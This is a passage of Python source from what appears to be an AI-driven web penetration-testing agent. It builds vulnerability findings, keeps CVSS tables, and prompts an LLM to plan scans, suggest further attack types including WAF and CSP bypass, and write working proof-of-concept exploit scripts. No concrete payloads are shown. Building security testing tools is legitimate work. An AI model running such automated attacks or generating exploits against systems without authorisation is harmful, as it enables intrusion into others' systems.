- Payload: {finding_dict.get('payload', '')[:200]}
- Evidence: {finding_dict.get('evidence', '')[:500]}

Respond in this exact JSON format:
{{"effective": true/false, "impact_level": "critical/high/medium/low", "exploitation_notes": "brief notes", "false_positive_risk": "low/medium/high", "additional_steps": ["step1", "step2"]}}"""

            system = get_system_prompt("confirmation")
            return await self.llm.generate_json(prompt, system, task_type="validate_exploitation")
        except Exception:
            return None

    async def _ai_suggest_next_tests(self, findings_summary: str,
                                      targets: List[str]) -> List[str]:
        """Use AI to suggest additional vulnerability types to test based on findings so far.

        Returns a list of vuln_type strings for additional testing.
        """
        if not self.llm.is_available():
            return []

        try:
            prompt = f"""Based on these vulnerability scan findings, suggest up to 5 additional vulnerability types to test.

**Current findings:**
{findings_summary[:1500]}

**Targets tested:**
{chr(10).join(targets[:5])}

Available vulnerability types: sqli_error, sqli_union, sqli_blind, sqli_time, xss_reflected, xss_stored, xss_dom, ssti, command_injection, lfi, path_traversal, ssrf, open_redirect, idor, csrf, cors_misconfig, nosql_injection, xxe, deserialization, jwt_manipulation, race_condition, mass_assignment, graphql_introspection, subdomain_takeover, http_request_smuggling, cache_poisoning, prototype_pollution

Respond with ONLY a JSON array of vulnerability type strings to test next:
["type1", "type2", ...]"""

            system = get_system_prompt("strategy")
            suggestions = await self.llm.generate_json(prompt, system, task_type="suggest_tests", array=True)
            if not suggestions:
                return []
            # Validate against known types
            valid = [s for s in suggestions if isinstance(s, str) and s in self.VULN_TYPE_MAP]
            return valid[:5]
        except Exception:
            return []

    def _create_finding(self, vuln_type: str, url: str, param: str,
                        payload: str, evidence: str, response: Dict,
                        ai_confirmed: bool = False) -> Finding:
        """Create a finding object with full details from VulnEngine registry"""
        mapped = self._map_vuln_type(vuln_type)
        severity = self._get_severity(vuln_type)
        finding_id = hashlib.md5(f"{vuln_type}{url}{param}".encode()).hexdigest()[:8]

        parsed = urlparse(url)
        path = parsed.path or '/'

        # Build a more realistic HTTP request representation
        full_url = response.get('url', url)
        method = response.get('method', 'GET')
        status = response.get('status', 200)
        injection_point = response.get('injection_point', 'parameter')
        injected_header = response.get('injected_header', '')

        # Build HTTP request based on injection point
        if injection_point == "header" and injected_header:
            http_request = f"""{method} {path} HTTP/1.1
Host: {parsed.netloc}
{injected_header}: {payload}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close"""
        elif injection_point == "body":
            http_request = f"""{method} {path} HTTP/1.1
Host: {parsed.netloc}
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Connection: close

{param}={payload}"""
        elif injection_point == "path":
            http_request = f"""{method} {path}/{payload} HTTP/1.1
Host: {parsed.netloc}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Connection: close"""
        else:
            http_request = f"""{method} {path}?{param}={payload} HTTP/1.1
Host: {parsed.netloc}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close"""

        # Format response excerpt
        response_body = response.get('body', '')[:1000]
        http_response = f"""HTTP/1.1 {status} OK
Content-Type: {response.get('content_type', 'text/html')}

{response_body}"""

        # Pull rich metadata from VulnEngine registry
        registry_title = self.vuln_registry.get_title(mapped)
        cwe_id = self.vuln_registry.get_cwe_id(mapped)
        description = self.vuln_registry.get_description(mapped)
        impact = self.vuln_registry.get_impact(mapped)
        remediation = self.vuln_registry.get_remediation(mapped)

        # Generate PoC code
        poc_code = ""
        try:
            poc_code = self.poc_generator.generate(
                vuln_type, full_url, param, payload, evidence, method
            )
        except Exception:
            pass

        return Finding(
            id=finding_id,
            title=registry_title or f"{vuln_type.upper()} in {path}",
            severity=severity,
            vulnerability_type=vuln_type,
            cvss_score=self._get_cvss_score(vuln_type),
            cvss_vector=self._get_cvss_vector(vuln_type),
            cwe_id=cwe_id,
            description=description,
            affected_endpoint=full_url,
            parameter=param,
            payload=payload,
            evidence=evidence,
            impact=impact,
            poc_code=poc_code,
            remediation=remediation,
            response=http_response,
            request=http_request,
            ai_verified=ai_confirmed,
            confidence="90" if ai_confirmed else "50",
            confidence_score=90 if ai_confirmed else 50,
        )

    # CVSS vectors keyed by registry type (fallback for types without tester)
    _CVSS_VECTORS = {
        # Critical (9.0+)
        "command_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "sqli_error": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "sqli_union": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "ssti": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "rfi": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "insecure_deserialization": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "auth_bypass": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "ssrf_cloud": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
        "container_escape": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
        "expression_language_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        # High (7.0-8.9)
        "sqli_blind": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "sqli_time": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "lfi": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "ssrf": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
        "xxe": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
        "path_traversal": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "nosql_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "file_upload": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "privilege_escalation": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "jwt_manipulation": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "arbitrary_file_read": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "arbitrary_file_delete": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
        "zip_slip": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        "bola": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "bfla": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "ldap_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "xpath_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "http_smuggling": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "subdomain_takeover": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N",
        "mass_assignment": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "race_condition": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "cloud_metadata_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
        "host_header_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "orm_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "soap_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "graphql_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "session_fixation": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        "oauth_misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
        "default_credentials": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "s3_bucket_misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "serverless_misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "source_code_disclosure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "api_key_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        # Medium (4.0-6.9)
        "xss_reflected": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "xss_stored": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
        "xss_dom": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "blind_xss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "mutation_xss": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "idor": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
        "csrf": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "open_redirect": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "cors_misconfig": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "clickjacking": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "crlf_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "header_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "email_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
        "log_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "html_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "csv_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "prototype_pollution": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "cache_poisoning": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "parameter_pollution": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "type_juggling": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "forced_browsing": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "directory_listing": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "debug_mode": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "exposed_admin_panel": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "exposed_api_docs": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "insecure_cookie_flags": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "graphql_introspection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "graphql_dos": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "dom_clobbering": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "postmessage_vulnerability": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "websocket_hijacking": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "css_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N",
        "tabnabbing": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "rate_limit_bypass": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
        "business_logic": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
        "timing_attack": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "weak_password": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "brute_force": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "two_factor_bypass": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "backup_file_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "sensitive_data_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "excessive_data_exposure": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "rest_api_versioning": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "api_rate_limiting": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        # Low / Info (0-3.9)
        "security_headers": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "ssl_issues": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "http_methods": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "information_disclosure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "version_disclosure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "improper_error_handling": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "cleartext_transmission": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "weak_encryption": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "weak_hashing": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "weak_random": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "vulnerable_dependency": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "outdated_component": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "insecure_cdn": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    }

    _CVSS_SCORES = {
        # Critical
        "command_injection": 10.0, "sqli_error": 9.8, "sqli_union": 9.8,
        "ssti": 9.8, "rfi": 9.8, "insecure_deserialization": 9.8,
        "expression_language_injection": 9.8, "container_escape": 9.0,
        "auth_bypass": 9.1, "ssrf_cloud": 9.1, "default_credentials": 9.1,
        # High
        "sqli_blind": 7.5, "sqli_time": 7.5, "lfi": 7.5, "ssrf": 7.5,
        "xxe": 7.5, "path_traversal": 7.5, "nosql_injection": 7.5,
        "ldap_injection": 7.5, "xpath_injection": 7.5, "orm_injection": 7.5,
        "graphql_injection": 7.5, "soap_injection": 7.5,
        "jwt_manipulation": 8.2, "file_upload": 8.8,
        "privilege_escalation": 8.8, "bfla": 8.1,
        "arbitrary_file_read": 7.5, "arbitrary_file_delete": 7.5,
        "zip_slip": 7.5, "http_smuggling": 8.1,
        "subdomain_takeover": 8.2, "mass_assignment": 7.5,
        "race_condition": 7.5, "cloud_metadata_exposure": 8.6,
        "host_header_injection": 6.5, "session_fixation": 7.5,
        "oauth_misconfiguration": 8.1, "s3_bucket_misconfiguration": 7.5,
        "serverless_misconfiguration": 7.5,
        "source_code_disclosure": 7.5, "api_key_exposure": 7.5,
        "two_factor_bypass": 7.5, "bola": 6.5,
        "type_juggling": 7.4, "backup_file_exposure": 7.5,
        "excessive_data_exposure": 6.5,
        # Medium
        "xss_reflected": 6.1, "xss_stored": 6.1, "xss_dom": 6.1,
        "blind_xss": 6.1, "mutation_xss": 5.4,
        "crlf_injection": 5.4, "csv_injection": 6.1,
        "email_injection": 5.4, "html_injection": 4.7,
        "prototype_pollution": 5.6, "cache_poisoning": 5.4,
        "graphql_dos": 7.5,
        "idor": 5.3, "csrf": 4.3, "open_redirect": 4.3,
        "cors_misconfig": 4.3, "clickjacking": 4.3,
        "header_injection": 4.3, "log_injection": 4.3,
        "forced_browsing": 5.3,
        "parameter_pollution": 4.3, "timing_attack": 5.9,
        "dom_clobbering": 4.7, "postmessage_vulnerability": 6.1,
        "websocket_hijacking": 5.3, "css_injection": 4.3, "tabnabbing": 4.3,
        "directory_listing": 5.3, "debug_mode": 5.3,
        "exposed_admin_panel": 5.3, "exposed_api_docs": 5.3,
        "insecure_cookie_flags": 4.3,
        "rate_limit_bypass": 4.3, "business_logic": 5.3,
        "sensitive_data_exposure": 5.3,
        "weak_password": 5.3, "brute_force": 5.3,
        "graphql_introspection": 5.3,
        "rest_api_versioning": 3.7, "api_rate_limiting": 4.3,
        "cleartext_transmission": 5.9, "weak_encryption": 5.9,
        # Low / Info
        "security_headers": 2.6, "ssl_issues": 3.7, "http_methods": 3.1,
        "information_disclosure": 3.7, "version_disclosure": 3.1,
        "improper_error_handling": 3.7,
        "weak_hashing": 3.7, "weak_random": 3.7,
        "vulnerable_dependency": 5.3, "outdated_component": 3.7,
        "insecure_cdn": 3.7,
    }

    def _get_cvss_vector(self, vuln_type: str) -> str:
        """Get CVSS 3.1 vector string for vulnerability type via registry"""
        mapped = self._map_vuln_type(vuln_type)
        return self._CVSS_VECTORS.get(mapped, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N")

    def _get_severity(self, vuln_type: str) -> str:
        """Get severity for vulnerability type from VulnEngine registry"""
        mapped = self._map_vuln_type(vuln_type)
        return self.vuln_registry.get_severity(mapped)

    def _get_cvss_score(self, vuln_type: str) -> float:
        """Get CVSS score for vulnerability type"""
        mapped = self._map_vuln_type(vuln_type)
        return self._CVSS_SCORES.get(mapped, 5.0)

    # ==================== AI ENHANCEMENT ====================

    async def _ai_enhance_findings(self):
        """Enhance findings with AI-generated details"""
        if not self.llm.is_available():
            await self.log("info", "  Skipping AI enhancement (LLM not available)")
            return

        for finding in self.findings:
            await self.log("info", f"  Enhancing: {finding.title}")
            enhanced = await self._enhance_single_finding(finding)

            finding.cwe_id = enhanced.get("cwe_id", "")
            finding.description = enhanced.get("description", "")
            finding.impact = enhanced.get("impact", "")
            finding.poc_code = enhanced.get("poc_code", "")
            finding.remediation = enhanced.get("remediation", "")
            finding.references = enhanced.get("references", [])

            if enhanced.get("cvss_score"):
                finding.cvss_score = enhanced["cvss_score"]
            if enhanced.get("cvss_vector"):
                finding.cvss_vector = enhanced["cvss_vector"]

    async def _enhance_single_finding(self, finding: Finding) -> Dict:
        """AI enhancement for single finding"""
        prompt = f"""Generate comprehensive details for this confirmed security vulnerability to include in a professional penetration testing report.

**Vulnerability Details:**
- Type: {finding.vulnerability_type.upper()}
- Title: {finding.title}
- Affected Endpoint: {finding.affected_endpoint}
- Vulnerable Parameter: {finding.parameter}
- Payload Used: {finding.payload}
- Evidence: {finding.evidence}

**Required Output:**

1. **CVSS 3.1 Score:** Calculate accurately based on:
   - Attack Vector (AV): Network (most web vulns)
   - Attack Complexity (AC): Low/High based on prerequisites
   - Privileges Required (PR): None/Low/High
   - User Interaction (UI): None/Required
   - Scope (S): Unchanged/Changed
   - Impact: Confidentiality/Integrity/Availability

2. **CWE ID:** Provide the MOST SPECIFIC CWE for this vulnerability type:
   - SQL Injection: CWE-89 (or CWE-564 for Hibernate)
   - XSS Reflected: CWE-79, Stored: CWE-79
   - LFI: CWE-22 or CWE-98
   - SSTI: CWE-94 or CWE-1336
   - SSRF: CWE-918
   - RCE: CWE-78 (OS Command) or CWE-94 (Code Injection)

3. **Description:** Write 2-3 paragraphs explaining:
   - What the vulnerability is and how it was discovered
   - Technical details of how the exploitation works
   - The specific context in this application

4. **Impact:** Describe REALISTIC business and technical impact:
   - What data/systems could be compromised?
   - What's the worst-case scenario?
   - Compliance implications (PCI-DSS, GDPR, etc.)

5. **Proof of Concept:** Working Python script that:
   - Uses the requests library
   - Demonstrates the vulnerability
   - Includes comments explaining each step

6. **Remediation:** Specific, actionable steps:
   - Code-level fixes (with examples)
   - Framework/library recommendations
   - Defense-in-depth measures

7. **References:** Include links to:
   - OWASP guidance
   - CWE/CVE if applicable
   - Vendor documentation

Respond in JSON format:
{{
    "cvss_score": 8.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe_id": "CWE-89",
    "description": "A SQL injection vulnerability...",
    "impact": "An attacker could...",
    "poc_code": "import requests\\n\\n# PoC for SQL Injection\\n...",
    "remediation": "1. Use parameterized queries...\\n2. Implement input validation...",
    "references": ["https://owasp.org/Top10/A03_2021-Injection/", "https://cwe.mitre.org/data/definitions/89.html"]
}}"""

        try:
            system = get_system_prompt("reporting")
            result = await self.llm.generate_json(prompt, system, task_type="enhance_finding")
            return result or {}
        except Exception as e:
            await self.log("debug", f"AI enhance error: {e}")

        return {}

    # ==================== PROMPT-ONLY MODE ====================

    async def _run_prompt_only(self) -> Dict:
        """Prompt-only mode - AI decides everything"""
        await self.log("warning", "PROMPT-ONLY MODE: AI will decide what tools to use")
        await self.log("warning", "This mode uses more tokens than other modes")
        await self._update_progress(0, "AI Planning")

        prompt = self.custom_prompt or (self.task.prompt if hasattr(self.task, 'prompt') else "")
        if not prompt:
            prompt = DEFAULT_ASSESSMENT_PROMPT

        # Phase 1: AI Planning
        await self.log("info", "[PHASE 1/4] AI Planning")
        plan = await self._ai_create_plan(prompt)
        await self._update_progress(25, "Plan created")

        # Phase 2: Execute Plan
        await self.log("info", "[PHASE 2/4] Executing Plan")
        for step in plan.get("steps", ["recon", "test", "report"]):
            await self.log("info", f"  Executing: {step}")
            await self._execute_plan_step(step)
        await self._update_progress(70, "Plan executed")

        # Phase 3: Analyze Results
        await self.log("info", "[PHASE 3/4] Analyzing Results")
        await self._ai_enhance_findings()
        await self._update_progress(85, "Analysis complete")

        # Phase 4: Generate Report
        await self.log("info", "[PHASE 4/4] Generating Report")
        report = await self._generate_full_report()
        await self._update_progress(100, "Complete")

        return report

    async def _ai_create_plan(self, prompt: str) -> Dict:
        """AI creates execution plan"""
        if not self.llm.is_available():
            return {"steps": ["recon", "test", "report"]}

        system = """You are an autonomous penetration testing agent. Your role is to:
1. Understand the user's security testing request
2. Create an efficient, targeted testing plan
3. Ensure thorough coverage while avoiding redundant testing

Always start with reconnaissance unless already done, and always end with report generation."""

        plan_prompt = f"""**Security Testing Request:**
User Request: {prompt}
Target: {self.target}

**Available Actions (predefined):**
- recon: Discover endpoints, parameters, forms, and technologies
- scan_sqli: Test for SQL injection
- scan_xss: Test for Cross-Site Scripting
- scan_lfi: Test for Local File Inclusion / Path Traversal
- scan_ssti: Test for Server-Side Template Injection
- scan_ssrf: Test for Server-Side Request Forgery
- clickjacking: Test for Clickjacking
- security_headers: Test security headers
- cors: Test for CORS misconfigurations
- scan_all: Comprehensive vulnerability testing
- report: Generate final assessment report

**IMPORTANT: You can also use ANY custom vulnerability type as a step!**
For vulnerabilities not in the predefined list, just use the vulnerability name as the step.
The AI will dynamically generate tests for it.

Examples of custom steps you can use:
- "xxe" - XML External Entity injection
- "race_condition" - Race condition testing
- "rate_limit_bypass" - Rate limiting bypass
- "jwt_vulnerabilities" - JWT security issues
- "bola" - Broken Object Level Authorization
- "bfla" - Broken Function Level Authorization
- "graphql_injection" - GraphQL specific attacks
- "nosql_injection" - NoSQL injection
- "waf_bypass" - WAF bypass techniques
- "csp_bypass" - CSP bypass techniques
- "prototype_pollution" - Prototype pollution
- "deserialization" - Insecure deserialization
- "mass_assignment" - Mass assignment vulnerabilities
- "business_logic" - Business logic flaws
- Any other vulnerability type you can think of!

**Planning Guidelines:**
1. Start with 'recon' to gather information
2. Add steps based on user request - use predefined OR custom vulnerability names
3. Always end with 'report'

**Examples:**
- "Test for XXE" → {{"steps": ["recon", "xxe", "report"]}}
- "Check race conditions and rate limiting" → {{"steps": ["recon", "race_condition", "rate_limit_bypass", "report"]}}
- "Test BOLA and BFLA" → {{"steps": ["recon", "bola", "bfla", "report"]}}
- "Full API security test" → {{"steps": ["recon", "bola", "bfla", "jwt_vulnerabilities", "mass_assignment", "report"]}}
- "WAF bypass and XSS" → {{"steps": ["recon", "waf_bypass", "scan_xss", "report"]}}

Respond with your execution plan in JSON format:
{{"steps": ["action1", "action2", ...]}}"""

        try:
            plan = await self.llm.generate_json(plan_prompt, get_system_prompt("strategy"), task_type="create_plan")
            if plan:
                return plan
        except Exception:
            pass

        # Fallback: parse prompt keywords to determine steps
        # This fallback now supports ANY vulnerability type via AI dynamic testing
        prompt_lower = prompt.lower()
        steps = ["recon"]

        # Known vulnerability mappings
        vuln_mappings = {
            # Predefined tests
            "clickjack": "clickjacking", "x-frame": "clickjacking", "framing": "clickjacking",
            "security header": "security_headers",
            "cors": "cors",
            "sqli": "scan_sqli", "sql injection": "scan_sqli",
            "xss": "scan_xss", "cross-site script": "scan_xss",
            "lfi": "scan_lfi", "file inclusion": "scan_lfi", "path traversal": "scan_lfi",
            "ssti": "scan_ssti", "template injection": "scan_ssti",
            "ssrf": "scan_ssrf",
            # Advanced vulnerabilities - will use AI dynamic testing
            "xxe": "xxe", "xml external": "xxe",
            "race condition": "race_condition", "race": "race_condition",
            "rate limit": "rate_limit_bypass", "rate-limit": "rate_limit_bypass",
            "bola": "bola", "broken object": "bola",
            "bfla": "bfla", "broken function": "bfla",
            "idor": "idor", "insecure direct": "idor",
            "jwt": "jwt_vulnerabilities",
            "graphql": "graphql_injection",
            "nosql": "nosql_injection",
            "waf bypass": "waf_bypass", "waf": "waf_bypass",
            "csp bypass": "csp_bypass",
            "prototype pollution": "prototype_pollution",
            "deserialization": "deserialization", "deserial": "deserialization",
            "mass assignment": "mass_assignment",
            "business logic": "business_logic",
            "open redirect": "open_redirect",
            "subdomain takeover": "subdomain_takeover",
            "host header": "host_header_injection",
            "cache poison": "cache_poisoning",
            "http smuggling": "http_smuggling", "request smuggling": "http_smuggling",
            "web cache": "cache_poisoning",
            "parameter pollution": "parameter_pollution", "hpp": "parameter_pollution",
            "type juggling": "type_juggling",
            "timing attack": "timing_attack",
            "command injection": "command_injection", "rce": "command_injection",
        }

        matched_steps = set()
        for keyword, step in vuln_mappings.items():
            if keyword in prompt_lower:
                matched_steps.add(step)

        if matched_steps:
            steps.extend(list(matched_steps))
        else:
            # No known keywords matched - pass the entire prompt as a custom step
            # The AI dynamic testing will handle it
            custom_step = prompt.strip()[:100]  # Limit length
            if custom_step and custom_step.lower() not in ["test", "scan", "check", "find"]:
                steps.append(custom_step)
            else:
                steps.append("scan_all")

        steps.append("report")
        return {"steps": steps}

    async def _execute_plan_step(self, step: str):
        """Execute a plan step - supports ANY vulnerability type via AI dynamic testing"""
        step_lower = step.lower()
        await self.log("debug", f"Executing plan step: {step}")

        # Known vulnerability types with predefined tests
        if "recon" in step_lower or "information" in step_lower or "discovery" in step_lower:
            await self._run_recon_only()
        elif "scan_all" in step_lower:
            await self._test_all_vulnerabilities(self._default_attack_plan())
        elif "sqli" in step_lower or "sql injection" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["sqli"]})
        elif "xss" in step_lower or "cross-site script" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["xss"]})
        elif "lfi" in step_lower or "local file" in step_lower or "path traversal" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["lfi"]})
        elif "ssti" in step_lower or "template injection" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["ssti"]})
        elif "ssrf" in step_lower or "server-side request" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["ssrf"]})
        elif "clickjack" in step_lower or "x-frame" in step_lower or "framing" in step_lower:
            await self.log("info", "  Testing for clickjacking/X-Frame-Options")
            await self._test_security_headers("clickjacking")
        elif "security_header" in step_lower or ("header" in step_lower and "security" in step_lower):
            await self.log("info", "  Testing security headers")
            await self._test_security_headers("all")
        elif "cors" in step_lower:
            await self.log("info", "  Testing CORS configuration")
            await self._test_cors()
        elif "info_disclos" in step_lower or ("information" in step_lower and "disclosure" in step_lower):
            await self.log("info", "  Testing for information disclosure")
            await self._test_information_disclosure()
        elif "report" in step_lower or "document" in step_lower:
            await self.log("info", "  Report will be generated at the end")
        else:
